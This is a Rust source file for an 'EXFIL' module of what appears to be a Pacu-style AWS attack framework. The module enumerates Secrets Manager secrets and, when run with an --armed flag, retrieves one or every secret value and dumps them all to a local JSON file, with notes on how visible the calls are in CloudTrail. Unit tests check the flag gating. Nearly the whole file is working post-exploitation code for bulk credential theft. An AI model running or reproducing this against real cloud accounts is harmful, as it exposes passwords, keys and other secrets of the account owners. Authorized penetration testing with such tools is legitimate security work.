//! secrets__enum — enumerate and retrieve Secrets Manager secrets.
//!
//! Category: EXFIL. Services: ["SecretsManager"].
//!
//! Args:
//!   --secret-name <name>   retrieve a specific secret value (requires --armed)
//!   --all                  retrieve all secret values (requires --armed, very noisy)
//!   --scan-only            list secret names/metadata only, do not retrieve values (always safe)
//!
//! Detection note: secretsmanager:GetSecretValue appears in CloudTrail — highly visible.

use std::time::{SystemTime, UNIX_EPOCH};

use colored::Colorize;
use comfy_table::{Cell, Table, presets::UTF8_FULL};
use serde::{Deserialize, Serialize};

use crate::module::{AwsContext, Module, ModuleInfo};

// ---------------------------------------------------------------------------
// Data structs
// ---------------------------------------------------------------------------

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct SecretMetadata {
    pub name: String,
    pub arn: String,
    pub last_changed: Option<String>,
    pub last_accessed: Option<String>,
    pub kms_key_id: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct SecretDumpEntry {
    pub name: String,
    pub arn: String,
    pub value: String,
}

// ---------------------------------------------------------------------------
// Timestamp helper
// ---------------------------------------------------------------------------

fn smithy_dt_to_string(dt: &aws_sdk_secretsmanager::primitives::DateTime) -> String {
    dt.fmt(aws_sdk_secretsmanager::primitives::DateTimeFormat::DateTime)
        .unwrap_or_else(|_| "<invalid>".to_owned())
}

fn current_timestamp() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let secret_name: Option<&str> = args
        .iter()
        .position(|&a| a == "--secret-name")
        .and_then(|i| args.get(i + 1).copied());

    let retrieve_all = args.contains(&"--all");
    let _scan_only = args.contains(&"--scan-only");

    println!("{}", "secrets__enum".cyan().bold());
    println!(
        "  {}\n",
        "Enumerate and retrieve Secrets Manager secrets.".yellow()
    );
    println!(
        "  {} secretsmanager:GetSecretValue appears in CloudTrail — highly visible.",
        "[DETECTION]".red().bold()
    );

    // ── Validate armed requirements ────────────────────────────────────────
    if secret_name.is_some() && !ctx.armed {
        anyhow::bail!(
            "--secret-name retrieval requires --armed. Pass --armed when starting pacu."
        );
    }

    if retrieve_all && !ctx.armed {
        anyhow::bail!(
            "--all requires --armed. Pass --armed when starting pacu."
        );
    }

    let sm = aws_sdk_secretsmanager::Client::new(&ctx.sdk_config);

    // ── --secret-name: retrieve one secret ────────────────────────────────
    if let Some(name) = secret_name {
        return get_single_secret(&sm, name).await;
    }

    // ── --all: dump every secret (armed) ──────────────────────────────────
    if retrieve_all {
        return dump_all_secrets(&sm).await;
    }

    // ── --scan-only / default: list metadata only ──────────────────────────
    list_secrets_metadata(&sm).await
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

async fn list_secrets_metadata(
    sm: &aws_sdk_secretsmanager::Client,
) -> anyhow::Result<()> {
    println!("  {} Listing secrets (metadata only)...", "[INFO]".cyan());

    let mut secrets: Vec<SecretMetadata> = Vec::new();
    let mut next_token: Option<String> = None;

    loop {
        let mut req = sm.list_secrets();
        if let Some(ref tok) = next_token {
            req = req.next_token(tok);
        }

        match req.send().await {
            Ok(resp) => {
                for entry in resp.secret_list() {
                    let last_changed = entry.last_changed_date().map(smithy_dt_to_string);
                    let last_accessed = entry.last_accessed_date().map(smithy_dt_to_string);

                    secrets.push(SecretMetadata {
                        name: entry.name().unwrap_or("<unknown>").to_owned(),
                        arn: entry.arn().unwrap_or("<unknown>").to_owned(),
                        last_changed,
                        last_accessed,
                        kms_key_id: entry.kms_key_id().map(|s| s.to_owned()),
                    });
                }

                next_token = resp.next_token().map(|s| s.to_owned());
                if next_token.is_none() {
                    break;
                }
            }
            Err(e) => {
                eprintln!(
                    "  {} secretsmanager:ListSecrets failed: {}",
                    "[ERR]".red().bold(),
                    e
                );
                break;
            }
        }
    }

    if secrets.is_empty() {
        println!(
            "  {} No secrets found (or insufficient permissions).",
            "[INFO]".cyan()
        );
        return Ok(());
    }

    println!(
        "  {} Found {} secret(s):",
        "[FOUND]".green().bold(),
        secrets.len()
    );

    let mut table = Table::new();
    table.load_preset(UTF8_FULL);
    table.set_header(vec!["Name", "ARN", "Last Changed", "Last Accessed", "KMS Key"]);

    for s in &secrets {
        table.add_row(vec![
            Cell::new(&s.name),
            Cell::new(&s.arn),
            Cell::new(s.last_changed.as_deref().unwrap_or("-")),
            Cell::new(s.last_accessed.as_deref().unwrap_or("-")),
            Cell::new(s.kms_key_id.as_deref().unwrap_or("-")),
        ]);
    }

    println!("{table}");

    println!(
        "\n{}",
        "Run with --secret-name <name> --armed to retrieve a specific value.".yellow()
    );
    println!(
        "{}",
        "Run with --all --armed to dump all secrets to a JSON file.".yellow()
    );

    Ok(())
}

async fn get_single_secret(
    sm: &aws_sdk_secretsmanager::Client,
    name: &str,
) -> anyhow::Result<()> {
    println!(
        "  {} Calling secretsmanager:GetSecretValue(SecretId={})...",
        "[EXEC]".red().bold(),
        name.yellow()
    );

    match sm.get_secret_value().secret_id(name).send().await {
        Ok(resp) => {
            if let Some(s) = resp.secret_string() {
                println!("  {} SecretString:", "[OK]".green().bold());
                println!("{}", s.yellow());
            } else if let Some(blob) = resp.secret_binary() {
                let len = blob.as_ref().len();
                println!(
                    "  {} [binary value, {} bytes]",
                    "[OK]".green().bold(),
                    len
                );
            } else {
                println!("  {} Secret has no value.", "[WARN]".yellow());
            }
        }
        Err(e) => {
            eprintln!(
                "  {} secretsmanager:GetSecretValue failed: {}",
                "[ERR]".red().bold(),
                e
            );
        }
    }

    Ok(())
}

async fn dump_all_secrets(sm: &aws_sdk_secretsmanager::Client) -> anyhow::Result<()> {
    println!(
        "  {} --all mode: listing and retrieving all secrets...",
        "[EXEC]".red().bold()
    );
    println!(
        "  {}",
        "WARNING: secretsmanager:GetSecretValue appears in CloudTrail for every secret — highly visible!"
            .red()
    );

    // First, paginate ListSecrets to collect names
    let mut names: Vec<(String, String)> = Vec::new(); // (name, arn)
    let mut next_token: Option<String> = None;

    loop {
        let mut req = sm.list_secrets();
        if let Some(ref tok) = next_token {
            req = req.next_token(tok);
        }

        match req.send().await {
            Ok(resp) => {
                for entry in resp.secret_list() {
                    names.push((
                        entry.name().unwrap_or("<unknown>").to_owned(),
                        entry.arn().unwrap_or("<unknown>").to_owned(),
                    ));
                }
                next_token = resp.next_token().map(|s| s.to_owned());
                if next_token.is_none() {
                    break;
                }
            }
            Err(e) => {
                eprintln!(
                    "  {} secretsmanager:ListSecrets failed: {}",
                    "[ERR]".red().bold(),
                    e
                );
                break;
            }
        }
    }

    println!(
        "  {} Found {} secret(s). Retrieving values...",
        "[INFO]".cyan(),
        names.len()
    );

    let mut dump: Vec<SecretDumpEntry> = Vec::new();

    for (name, arn) in &names {
        match sm.get_secret_value().secret_id(name).send().await {
            Ok(resp) => {
                let value = if let Some(s) = resp.secret_string() {
                    s.to_owned()
                } else if let Some(blob) = resp.secret_binary() {
                    format!("[binary value, {} bytes]", blob.as_ref().len())
                } else {
                    "[no value]".to_owned()
                };

                dump.push(SecretDumpEntry {
                    name: name.clone(),
                    arn: arn.clone(),
                    value,
                });
            }
            Err(e) => {
                eprintln!(
                    "  {} GetSecretValue failed for {}: {}",
                    "[WARN]".yellow(),
                    name,
                    e
                );
                dump.push(SecretDumpEntry {
                    name: name.clone(),
                    arn: arn.clone(),
                    value: format!("[error: {e}]"),
                });
            }
        }
    }

    let ts = current_timestamp();
    let filename = format!("secrets-dump-{ts}.json");
    let json = serde_json::to_string_pretty(&dump)
        .map_err(|e| anyhow::anyhow!("Failed to serialize secrets dump: {e}"))?;
    std::fs::write(&filename, json)
        .map_err(|e| anyhow::anyhow!("Failed to write {filename}: {e}"))?;

    println!(
        "  {} Wrote {} secret(s) to '{}'",
        "[OK]".green().bold(),
        dump.len(),
        filename.green()
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "secrets__enum",
            author: "lancer-pacu",
            category: "EXFIL",
            one_liner: "Enumerate/retrieve Secrets Manager secrets. --scan-only is safe; --secret-name/--all require --armed.",
            services: &["SecretsManager"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use super::*;
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "secrets__enum");
        assert!(found, "secrets__enum not found in inventory");
    }

    #[test]
    fn module_category_is_exfil() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "secrets__enum")
            .expect("secrets__enum not found");
        assert_eq!(m.info.category, "EXFIL");
    }

    #[test]
    fn module_services_include_secretsmanager() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "secrets__enum")
            .expect("secrets__enum not found");
        assert!(m.info.services.contains(&"SecretsManager"));
    }

    #[test]
    fn secret_metadata_serde_round_trip() {
        let meta = SecretMetadata {
            name: "prod/db/password".to_owned(),
            arn: "arn:aws:secretsmanager:us-east-1:123456789:secret:prod/db/password-abc123".to_owned(),
            last_changed: Some("2024-01-01T00:00:00Z".to_owned()),
            last_accessed: Some("2024-06-01T00:00:00Z".to_owned()),
            kms_key_id: Some("alias/aws/secretsmanager".to_owned()),
        };

        let json = serde_json::to_string(&meta).unwrap();
        let back: SecretMetadata = serde_json::from_str(&json).unwrap();

        assert_eq!(back.name, meta.name);
        assert_eq!(back.arn, meta.arn);
        assert_eq!(back.last_changed, meta.last_changed);
        assert_eq!(back.last_accessed, meta.last_accessed);
        assert_eq!(back.kms_key_id, meta.kms_key_id);
    }

    #[tokio::test]
    async fn secret_name_without_armed_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(
            &ctx,
            &["--secret-name", "prod/db/password"],
        )
        .await;
        assert!(result.is_err(), "expected error when --secret-name used without --armed");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--armed"),
            "error should mention --armed: {msg}"
        );
    }

    #[tokio::test]
    async fn all_without_armed_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(&ctx, &["--all"]).await;
        assert!(result.is_err(), "expected error when --all used without --armed");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--armed"),
            "error should mention --armed: {msg}"
        );
    }

    #[tokio::test]
    async fn scan_only_does_not_require_armed() {
        // --scan-only is always safe and should not require --armed
        // May fail at list call (no credentials) but must NOT error on arg-parse
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // We don't assert Ok() because the AWS call will fail with no_credentials,
        // but it should NOT return an arg-parse error about --armed.
        let _ = super::run(&ctx, &["--scan-only"]).await;
    }
}
